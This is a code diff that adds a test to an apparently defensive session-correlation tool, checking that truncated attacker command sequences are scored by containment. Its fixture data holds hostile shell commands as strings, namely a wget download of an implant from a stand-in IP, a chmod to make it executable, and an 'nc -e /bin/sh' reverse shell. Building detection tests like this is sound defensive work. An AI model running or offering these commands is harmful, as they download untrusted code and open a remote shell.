@@ -235,6 +235,43 @@ def test_corpus_weights_discount_a_family_that_cannot_discriminate():
     assert weighted["family_weights"]["identity"] > weighted["family_weights"]["behavior"]
 
 
+def test_truncated_sequences_are_compared_by_containment():
+    """A session that recorded fewer commands is not evidence of a difference."""
+    from app.correlation.features import Session
+    from app.correlation.scoring import compare
+
+    def session(name: str, commands: list[str]) -> Session:
+        built = Session(id=name)
+        built.commands = commands
+        built.actions = ["recon:id", "download:wget", "privilege:chmod", "lateral:nc"][
+            : len(commands)
+        ]
+        built.usernames = {"svc7"}
+        built.clients = {"ssh-2.0-toolkit7"}
+        built.event_ids = [f"{name}-{index}" for index in range(len(commands))]
+        return built
+
+    full = session(
+        "full",
+        ["id", "wget http://198.51.100.7/impl", "chmod +x impl", "nc -e /bin/sh 198.51.100.7 4444"],
+    )
+    partial = session("partial", ["id", "wget http://198.51.100.7/impl", "chmod +x impl"])
+
+    def sequence_score(result: dict) -> float:
+        return next(
+            component["score"]
+            for component in result["components"]
+            if component["name"] == "action_sequence"
+        )
+
+    overlapping = compare(full, partial)
+    jaccard = compare(full, partial, sequence_overlap=False)
+    assert overlapping["sequence_similarity"] == "overlap"
+    assert jaccard["sequence_similarity"] == "jaccard"
+    assert sequence_score(overlapping) > sequence_score(jaccard)
+    assert overlapping["score"] >= jaccard["score"]
+
+
 def test_time_to_detection_measures_evidence_not_scheduling():
     """Stage 12 asks for time to detection; it must be computed, not asserted."""
     from datetime import datetime, timedelta, timezone
